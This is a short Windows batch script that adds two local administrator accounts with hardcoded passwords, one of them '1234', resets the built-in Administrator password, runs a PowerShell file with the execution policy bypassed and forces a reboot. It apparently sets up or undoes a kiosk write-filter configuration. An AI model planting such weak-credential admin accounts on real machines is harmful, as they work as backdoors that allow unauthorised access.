@echo off
net user UWF-Admin Admin@munchy /add
net localgroup Administrators UWF-Admin /add
net user Administrator ????4265!!!!
net user Computer 1234 /add
net localgroup Administrators Computer /add
Powershell -ExecutionPolicy Bypass -File "C:\undosetup.ps1"
shutdown -r -f -t 0
